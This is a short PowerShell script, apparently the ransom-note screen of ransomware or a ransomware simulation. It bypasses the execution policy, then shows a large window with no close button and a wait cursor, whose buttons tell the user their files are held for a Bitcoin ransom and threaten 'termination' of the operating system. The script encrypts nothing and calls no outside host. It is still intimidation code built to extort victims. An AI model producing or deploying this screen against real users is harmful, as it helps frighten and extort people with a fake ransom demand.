Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

Add-Type -AssemblyName presentationCore
Add-Type -AssemblyName System.Windows.Forms

$ImagePath = "C:\Users\User1\Favorites\UIImage.png"

$Form = New-Object System.Windows.Forms.Form
$Form.ControlBox = $False
$Form.Text = "ALERT"
$Form.Width = 1600
$Form.Height = 900
$Form.Cursor=[System.Windows.Forms.Cursors]::WaitCursor

$image = [System.Drawing.Image]::Fromfile($ImagePath)
    
$pictureBox = new-object Windows.Forms.PictureBox
$pictureBox.width=1600
$pictureBox.height= 900
$pictureBox.top=0
$pictureBox.left=0
$pictureBox.Image=$image

$Button2 = New-Object System.Windows.Forms.Button
$Button2.Text = "You have been a target of a ransom attack - Please pay in Bitcoin if you wish to use your files again"
$Button2.Width = 500
$Button2.Height = 100
$Button2.Location = New-Object System.Drawing.Point(105,700)
$Button2.Font = "Microsoft Sans Serif,16"

$Null = $Form.Controls.Add($Button2)

$Button3 = New-Object System.Windows.Forms.Button
$Button3.Text = "Failure to comply will lead to termination of your operating system!"
$Button3.Width = 500
$Button3.Height = 100
$Button3.Location = New-Object System.Drawing.Point(970,700)
$Button3.Font = "Microsoft Sans Serif,16"
$Null = $Form.Controls.Add($Button3)

$Form.Controls.add($pictureBox)
$Form.Add_Shown({$Form.Activate()})
$Null = $Form.ShowDialog()
